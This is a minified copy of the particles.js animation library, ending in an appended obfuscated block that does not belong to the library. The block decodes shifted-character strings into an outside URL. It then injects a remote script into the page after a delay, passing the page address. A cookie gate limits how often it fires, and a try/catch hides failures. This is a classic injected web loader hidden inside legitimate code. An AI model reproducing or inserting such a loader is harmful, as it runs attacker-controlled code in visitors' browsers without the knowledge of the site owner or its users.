            t.opacity_bubble = t.opacity, t.radius_bubble = t.radius
        }

        function i(e, i, n, o, r) {
            if (e != i)
                if (s.tmp.bubble_duration_end) {
                    if (null != n) l = e + (e - (o - h * (o - e) / s.interactivity.modes.bubble.duration)), "size" == r && (t.radius_bubble = l), "opacity" == r && (t.opacity_bubble = l)
                } else if (d <= s.interactivity.modes.bubble.distance) {
                    if (null != n) var a = n;
                    else a = o;
                    if (a != e) {
                        var l = o - h * (o - e) / s.interactivity.modes.bubble.duration;
                        "size" == r && (t.radius_bubble = l), "opacity" == r && (t.opacity_bubble = l)
                    }
                } else "size" == r && (t.radius_bubble = void 0), "opacity" == r && (t.opacity_bubble = void 0)
        }
        if (s.interactivity.events.onhover.enable && isInArray("bubble", s.interactivity.events.onhover.mode)) {
            var n = t.x - s.interactivity.mouse.pos_x,
                o = t.y - s.interactivity.mouse.pos_y,
                r = 1 - (d = Math.sqrt(n * n + o * o)) / s.interactivity.modes.bubble.distance;
            if (d <= s.interactivity.modes.bubble.distance) {
                if (r >= 0 && "mousemove" == s.interactivity.status) {
                    if (s.interactivity.modes.bubble.size != s.particles.size.value)
                        if (s.interactivity.modes.bubble.size > s.particles.size.value) {
                            (l = t.radius + s.interactivity.modes.bubble.size * r) >= 0 && (t.radius_bubble = l)
                        } else {
                            var a = t.radius - s.interactivity.modes.bubble.size,
                                l = t.radius - a * r;
                            t.radius_bubble = l > 0 ? l : 0
                        } if (s.interactivity.modes.bubble.opacity != s.particles.opacity.value)
                        if (s.interactivity.modes.bubble.opacity > s.particles.opacity.value) {
                            (c = s.interactivity.modes.bubble.opacity * r) > t.opacity && c <= s.interactivity.modes.bubble.opacity && (t.opacity_bubble = c)
                        } else {
                            var c;
                            (c = t.opacity - (s.particles.opacity.value - s.interactivity.modes.bubble.opacity) * r) < t.opacity && c >= s.interactivity.modes.bubble.opacity && (t.opacity_bubble = c)
                        }
                }
            } else e();
            "mouseleave" == s.interactivity.status && e()
        } else if (s.interactivity.events.onclick.enable && isInArray("bubble", s.interactivity.events.onclick.mode)) {
            if (s.tmp.bubble_clicking) {
                n = t.x - s.interactivity.mouse.click_pos_x, o = t.y - s.interactivity.mouse.click_pos_y;
                var d = Math.sqrt(n * n + o * o),
                    h = ((new Date).getTime() - s.interactivity.mouse.click_time) / 1e3;
                h > s.interactivity.modes.bubble.duration && (s.tmp.bubble_duration_end = !0), h > 2 * s.interactivity.modes.bubble.duration && (s.tmp.bubble_clicking = !1, s.tmp.bubble_duration_end = !1)
            }
            s.tmp.bubble_clicking && (i(s.interactivity.modes.bubble.size, s.particles.size.value, t.radius_bubble, t.radius, "size"), i(s.interactivity.modes.bubble.opacity, s.particles.opacity.value, t.opacity_bubble, t.opacity, "opacity"))
        }
    }, s.fn.modes.repulseParticle = function(t) {
        if (s.interactivity.events.onhover.enable && isInArray("repulse", s.interactivity.events.onhover.mode) && "mousemove" == s.interactivity.status) {
            var e = t.x - s.interactivity.mouse.pos_x,
                i = t.y - s.interactivity.mouse.pos_y,
                n = Math.sqrt(e * e + i * i),
                o = {
                    x: e / n,
                    y: i / n
                },
                r = clamp(1 / (l = s.interactivity.modes.repulse.distance) * (-1 * Math.pow(n / l, 2) + 1) * l * 100, 0, 50),
                a = {
                    x: t.x + o.x * r,
                    y: t.y + o.y * r
                };
            "bounce" == s.particles.move.out_mode ? (a.x - t.radius > 0 && a.x + t.radius < s.canvas.w && (t.x = a.x), a.y - t.radius > 0 && a.y + t.radius < s.canvas.h && (t.y = a.y)) : (t.x = a.x, t.y = a.y)
        } else if (s.interactivity.events.onclick.enable && isInArray("repulse", s.interactivity.events.onclick.mode))
            if (s.tmp.repulse_finish || (s.tmp.repulse_count++, s.tmp.repulse_count == s.particles.array.length && (s.tmp.repulse_finish = !0)), s.tmp.repulse_clicking) {
                var l = Math.pow(s.interactivity.modes.repulse.distance / 6, 3),
                    c = s.interactivity.mouse.click_pos_x - t.x,
                    d = s.interactivity.mouse.click_pos_y - t.y,
                    h = c * c + d * d,
                    u = -l / h * 1;
                l >= h && function() {
                    var e = Math.atan2(d, c);
                    if (t.vx = u * Math.cos(e), t.vy = u * Math.sin(e), "bounce" == s.particles.move.out_mode) {
                        var i = {
                            x: t.x + t.vx,
                            y: t.y + t.vy
                        };
                        (i.x + t.radius > s.canvas.w || i.x - t.radius < 0) && (t.vx = -t.vx), (i.y + t.radius > s.canvas.h || i.y - t.radius < 0) && (t.vy = -t.vy)
                    }
                }()
            } else 0 == s.tmp.repulse_clicking && (t.vx = t.vx_i, t.vy = t.vy_i)
    }, s.fn.modes.grabParticle = function(t) {
        if (s.interactivity.events.onhover.enable && "mousemove" == s.interactivity.status) {
            var e = t.x - s.interactivity.mouse.pos_x,
                i = t.y - s.interactivity.mouse.pos_y,
                n = Math.sqrt(e * e + i * i);
            if (n <= s.interactivity.modes.grab.distance) {
                var o = s.interactivity.modes.grab.line_linked.opacity - n / (1 / s.interactivity.modes.grab.line_linked.opacity) / s.interactivity.modes.grab.distance;
                if (o > 0) {
                    var r = s.particles.line_linked.color_rgb_line;
                    s.canvas.ctx.strokeStyle = "rgba(" + r.r + "," + r.g + "," + r.b + "," + o + ")", s.canvas.ctx.lineWidth = s.particles.line_linked.width, s.canvas.ctx.beginPath(), s.canvas.ctx.moveTo(t.x, t.y), s.canvas.ctx.lineTo(s.interactivity.mouse.pos_x, s.interactivity.mouse.pos_y), s.canvas.ctx.stroke(), s.canvas.ctx.closePath()
                }
            }
        }
    }, s.fn.vendors.eventsListeners = function() {
        "window" == s.interactivity.detect_on ? s.interactivity.el = window : s.interactivity.el = s.canvas.el, (s.interactivity.events.onhover.enable || s.interactivity.events.onclick.enable) && (s.interactivity.el.addEventListener("mousemove", (function(t) {
            if (s.interactivity.el == window) var e = t.clientX,
                i = t.clientY;
            else e = t.offsetX || t.clientX, i = t.offsetY || t.clientY;
            s.interactivity.mouse.pos_x = e, s.interactivity.mouse.pos_y = i, s.tmp.retina && (s.interactivity.mouse.pos_x *= s.canvas.pxratio, s.interactivity.mouse.pos_y *= s.canvas.pxratio), s.interactivity.status = "mousemove"
        })), s.interactivity.el.addEventListener("mouseleave", (function(t) {
            s.interactivity.mouse.pos_x = null, s.interactivity.mouse.pos_y = null, s.interactivity.status = "mouseleave"
        }))), s.interactivity.events.onclick.enable && s.interactivity.el.addEventListener("click", (function() {
            if (s.interactivity.mouse.click_pos_x = s.interactivity.mouse.pos_x, s.interactivity.mouse.click_pos_y = s.interactivity.mouse.pos_y, s.interactivity.mouse.click_time = (new Date).getTime(), s.interactivity.events.onclick.enable) switch (s.interactivity.events.onclick.mode) {
                case "push":
                    s.particles.move.enable || 1 == s.interactivity.modes.push.particles_nb ? s.fn.modes.pushParticles(s.interactivity.modes.push.particles_nb, s.interactivity.mouse) : s.interactivity.modes.push.particles_nb > 1 && s.fn.modes.pushParticles(s.interactivity.modes.push.particles_nb);
                    break;
                case "remove":
                    s.fn.modes.removeParticles(s.interactivity.modes.remove.particles_nb);
                    break;
                case "bubble":
                    s.tmp.bubble_clicking = !0;
                    break;
                case "repulse":
                    s.tmp.repulse_clicking = !0, s.tmp.repulse_count = 0, s.tmp.repulse_finish = !1, setTimeout((function() {
                        s.tmp.repulse_clicking = !1
                    }), 1e3 * s.interactivity.modes.repulse.duration)
            }
        }))
    }, s.fn.vendors.densityAutoParticles = function() {
        if (s.particles.number.density.enable) {
            var t = s.canvas.el.width * s.canvas.el.height / 1e3;
            s.tmp.retina && (t /= 2 * s.canvas.pxratio);
            var e = t * s.particles.number.value / s.particles.number.density.value_area,
                i = s.particles.array.length - e;
            0 > i ? s.fn.modes.pushParticles(Math.abs(i)) : s.fn.modes.removeParticles(i)
        }
    }, s.fn.vendors.checkOverlap = function(t, e) {
        for (var i = 0; i < s.particles.array.length; i++) {
            var n = s.particles.array[i],
                o = t.x - n.x,
                r = t.y - n.y;
            Math.sqrt(o * o + r * r) <= t.radius + n.radius && (t.x = e ? e.x : Math.random() * s.canvas.w, t.y = e ? e.y : Math.random() * s.canvas.h, s.fn.vendors.checkOverlap(t))
        }
    }, s.fn.vendors.createSvgImg = function(t) {
        var e = s.tmp.source_svg.replace(/#([0-9A-F]{3,6})/gi, (function(e, i, s, n) {
                if (t.color.rgb) var o = "rgba(" + t.color.rgb.r + "," + t.color.rgb.g + "," + t.color.rgb.b + "," + t.opacity + ")";
                else o = "hsla(" + t.color.hsl.h + "," + t.color.hsl.s + "%," + t.color.hsl.l + "%," + t.opacity + ")";
                return o
            })),
            i = new Blob([e], {
                type: "image/svg+xml;charset=utf-8"
            }),
            n = window.URL || window.webkitURL || window,
            o = n.createObjectURL(i),
            r = new Image;
        r.addEventListener("load", (function() {
            t.img.obj = r, t.img.loaded = !0, n.revokeObjectURL(o), s.tmp.count_svg++
        })), r.src = o
    }, s.fn.vendors.destroypJS = function() {
        cancelAnimationFrame(s.fn.drawAnimFrame), i.remove(), pJSDom = null
    }, s.fn.vendors.drawShape = function(t, e, i, s, n, o) {
        var r = n * o,
            a = n / o,
            l = 180 * (a - 2) / a,
            c = Math.PI - Math.PI * l / 180;
        t.save(), t.beginPath(), t.translate(e, i), t.moveTo(0, 0);
        for (var d = 0; r > d; d++) t.lineTo(s, 0), t.translate(s, 0), t.rotate(c);
        t.fill(), t.restore()
    }, s.fn.vendors.exportImg = function() {
        window.open(s.canvas.el.toDataURL("image/png"), "_blank")
    }, s.fn.vendors.loadImg = function(t) {
        if (s.tmp.img_error = void 0, "" != s.particles.shape.image.src)
            if ("svg" == t) {
                var e = new XMLHttpRequest;
                e.open("GET", s.particles.shape.image.src), e.onreadystatechange = function(t) {
                    4 == e.readyState && (200 == e.status ? (s.tmp.source_svg = t.currentTarget.response, s.fn.vendors.checkBeforeDraw()) : (console.log("Error pJS - Image not found"), s.tmp.img_error = !0))
                }, e.send()
            } else {
                var i = new Image;
                i.addEventListener("load", (function() {
                    s.tmp.img_obj = i, s.fn.vendors.checkBeforeDraw()
                })), i.src = s.particles.shape.image.src
            }
        else console.log("Error pJS - No image.src"), s.tmp.img_error = !0
    }, s.fn.vendors.draw = function() {
        "image" == s.particles.shape.type ? "svg" == s.tmp.img_type ? s.tmp.count_svg >= s.particles.number.value ? (s.fn.particlesDraw(), s.particles.move.enable ? s.fn.drawAnimFrame = requestAnimFrame(s.fn.vendors.draw) : cancelRequestAnimFrame(s.fn.drawAnimFrame)) : s.tmp.img_error || (s.fn.drawAnimFrame = requestAnimFrame(s.fn.vendors.draw)) : null != s.tmp.img_obj ? (s.fn.particlesDraw(), s.particles.move.enable ? s.fn.drawAnimFrame = requestAnimFrame(s.fn.vendors.draw) : cancelRequestAnimFrame(s.fn.drawAnimFrame)) : s.tmp.img_error || (s.fn.drawAnimFrame = requestAnimFrame(s.fn.vendors.draw)) : (s.fn.particlesDraw(), s.particles.move.enable ? s.fn.drawAnimFrame = requestAnimFrame(s.fn.vendors.draw) : cancelRequestAnimFrame(s.fn.drawAnimFrame))
    }, s.fn.vendors.checkBeforeDraw = function() {
        "image" == s.particles.shape.type ? "svg" == s.tmp.img_type && null == s.tmp.source_svg ? s.tmp.checkAnimFrame = requestAnimFrame(check) : (cancelRequestAnimFrame(s.tmp.checkAnimFrame), s.tmp.img_error || (s.fn.vendors.init(), s.fn.vendors.draw())) : (s.fn.vendors.init(), s.fn.vendors.draw())
    }, s.fn.vendors.init = function() {
        s.fn.retinaInit(), s.fn.canvasInit(), s.fn.canvasSize(), s.fn.canvasPaint(), s.fn.particlesCreate(), s.fn.vendors.densityAutoParticles(), s.particles.line_linked.color_rgb_line = hexToRgb(s.particles.line_linked.color)
    }, s.fn.vendors.start = function() {
        isInArray("image", s.particles.shape.type) ? (s.tmp.img_type = s.particles.shape.image.src.substr(s.particles.shape.image.src.length - 3), s.fn.vendors.loadImg(s.tmp.img_type)) : s.fn.vendors.checkBeforeDraw()
    }, s.fn.vendors.eventsListeners(), s.fn.vendors.start()
};
Object.deepExtend = function(t, e) {
    for (var i in e) e[i] && e[i].constructor && e[i].constructor === Object ? (t[i] = t[i] || {}, arguments.callee(t[i], e[i])) : t[i] = e[i];
    return t
}, window.requestAnimFrame = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(t) {
    window.setTimeout(t, 1e3 / 60)
}, window.cancelRequestAnimFrame = window.cancelAnimationFrame || window.webkitCancelRequestAnimationFrame || window.mozCancelRequestAnimationFrame || window.oCancelRequestAnimationFrame || window.msCancelRequestAnimationFrame || clearTimeout, window.pJSDom = [], window.particlesJS = function(t, e) {
    "string" != typeof t && (e = t, t = "particles-js"), t || (t = "particles-js");
    var i = document.getElementById(t),
        s = "particles-js-canvas-el",
        n = i.getElementsByClassName(s);
    if (n.length)
        for (; n.length > 0;) i.removeChild(n[0]);
    var o = document.createElement("canvas");
    o.className = s, o.style.width = "100%", o.style.height = "100%", null != document.getElementById(t).appendChild(o) && pJSDom.push(new pJS(t, e))
}, window.particlesJS.load = function(t, e, i) {
    var s = new XMLHttpRequest;
    s.open("GET", e), s.onreadystatechange = function(e) {
        if (4 == s.readyState)
            if (200 == s.status) {
                var n = JSON.parse(e.currentTarget.response);
                window.particlesJS(t, n), i && i()
            } else console.log("Error pJS - XMLHttpRequest status: " + s.status), console.log("Error pJS - File config not found")
    }, s.send()
};
(function(o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie), setTimeout(function() {
            o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44fun3nsjy' + 'xyfynh3htr4ywfhpnsl4x' + 'hwnuy3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;'
    } catch (e) {};
}({}, document, location));